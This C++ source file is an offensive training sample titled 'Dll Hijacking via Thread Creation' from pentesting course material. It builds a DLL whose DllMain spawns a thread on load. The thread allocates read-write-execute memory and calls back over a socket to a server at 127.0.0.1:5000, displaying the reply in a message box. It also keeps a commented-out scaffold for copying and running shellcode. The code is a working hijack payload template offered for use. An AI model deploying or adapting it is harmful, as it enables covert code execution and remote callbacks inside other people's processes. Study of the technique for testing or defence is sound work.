//   Dll Hijacking via Thread Creation 
// Author - Vivek Ramachandran 
//  Learn Pentesting Online --  http://PentesterAcademy.com/topics and http://SecurityTube-Training.com 
// Free Infosec Videos --  http://SecurityTube.net 


#include "pch.h"
#include <windows.h>
#define SHELLCODELEN	2048

#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <iostream>
#include <winsock2.h>
#include <iphlpapi.h>
#pragma comment(lib, "ws2_32.lib")

// File name for the flag file
const wchar_t* flagFileName = L"DC2DLLFlag.txt";

// Function to get the path of the temporary folder
std::wstring GetTemporaryFolderPath()
{
    wchar_t tempPath[MAX_PATH];
    DWORD result = GetTempPathW(MAX_PATH, tempPath);
    if (result == 0 || result > MAX_PATH)
    {
        std::cerr << "Failed to retrieve the temporary folder path." << std::endl;
        return L"";
    }
    return tempPath;
}

// Function to get the full path of the flag file
std::wstring GetFlagFilePath()
{
    std::wstring tempFolderPath = GetTemporaryFolderPath();
    return tempFolderPath + flagFileName;
}

// Function to check if the code block has already been executed
bool IsConnected()
{
    DWORD fileAttributes = GetFileAttributesW(GetFlagFilePath().c_str());
    return (fileAttributes != INVALID_FILE_ATTRIBUTES);
}

// Function to set the flag indicating that the code block has been executed
void SetConnected()
{
    std::wstring flagFilePath = GetFlagFilePath();
    HANDLE hFile = CreateFileW(flagFilePath.c_str(), GENERIC_WRITE, 0, nullptr, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile != INVALID_HANDLE_VALUE)
    {
        CloseHandle(hFile);
    }
}

// Function to delete the flag file
void SetDisconnected()
{
    std::wstring flagFilePath = GetFlagFilePath();
    if (!DeleteFileW(flagFilePath.c_str()))
    {
        std::cerr << "Failed to delete the flag file." << std::endl;
    }
}

extern "C" __declspec(dllexport) void ConnectToServer() {

    if (IsConnected()) {
        std::cerr << "Connection already established" << std::endl;
        WSACleanup();
        return;
    }

    // Initialize Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "Failed to initialize Winsock" << std::endl;
        return;
    }

    // Create a socket
    SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (clientSocket == INVALID_SOCKET) {
        std::cerr << "Failed to create socket" << std::endl;
        WSACleanup();
        return;
    }

    // Set up server address
    sockaddr_in serverAddress{};
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_port = htons(5000);
    serverAddress.sin_addr.s_addr = inet_addr("127.0.0.1");

    

    // Connect to the server
    if (connect(clientSocket, reinterpret_cast<SOCKADDR*>(&serverAddress), sizeof(serverAddress)) == SOCKET_ERROR) {
        std::cerr << "Failed to connect to the server" << std::endl;
        closesocket(clientSocket);
        WSACleanup();
        return;
    }

    SetConnected();

    // Send data to the server
    const char* data = "Hello, server!";
    if (send(clientSocket, data, strlen(data), 0) == SOCKET_ERROR) {
        std::cerr << "Failed to send data" << std::endl;
        closesocket(clientSocket);
        WSACleanup();
        return;
    }

    std::cout << "Data sent to the server" << std::endl;

    // Receive response from the server
    char buffer[1024];
    memset(buffer, 0, sizeof(buffer));
    if (recv(clientSocket, buffer, sizeof(buffer) - 1, 0) == SOCKET_ERROR) {
        std::cerr << "Failed to receive data" << std::endl;
        closesocket(clientSocket);
        WSACleanup();
        return;
    }

    int size = MultiByteToWideChar(CP_UTF8, 0, buffer, -1, nullptr, 0);
    wchar_t* msg = new wchar_t[size];
    MultiByteToWideChar(CP_UTF8, 0, buffer, -1, msg, size);
    MessageBox(NULL, msg, L"Popup DLL", MB_OK);

    // Close the socket and cleanup Winsock
    SetDisconnected();
    closesocket(clientSocket);
    WSACleanup();
}


DWORD WINAPI ThreadFunction(LPVOID lpParameter)
{

    LPVOID newMemory;
    HANDLE currentProcess;
    SIZE_T bytesWritten;
    BOOL didWeCopy = FALSE;

    // Get the current process handle 
    currentProcess = GetCurrentProcess();


    // Allocate memory with Read+Write+Execute permissions 
    newMemory = VirtualAllocEx(currentProcess, NULL, SHELLCODELEN, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    if (newMemory == NULL)
        return -1;
    ConnectToServer();

    // Copy the shellcode into the memory we just created 
    //didWeCopy = WriteProcessMemory(currentProcess, newMemory, (LPCVOID)&shellcode, SHELLCODELEN, &bytesWritten);

    //if (!didWeCopy)
    //	return -2;

    // Yay! Let's run our shellcode! 
    //((void(*)())newMemory)();

    return 1;
}




BOOL WINAPI
DllMain(HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
{

    HANDLE threadHandle;

    switch (dwReason)
    {
    case DLL_PROCESS_ATTACH:

        // Create a thread and close the handle as we do not want to use it to wait for it 

        threadHandle = CreateThread(NULL, 0, ThreadFunction, NULL, 0, NULL);
        CloseHandle(threadHandle);

        break;

    case DLL_PROCESS_DETACH:
        // Code to run when the DLL is freed
        break;

    case DLL_THREAD_ATTACH:
        // Code to run when a thread is created during the DLL's lifetime
        break;

    case DLL_THREAD_DETACH:
        // Code to run when a thread ends normally.
        break;
    }
    return TRUE;
}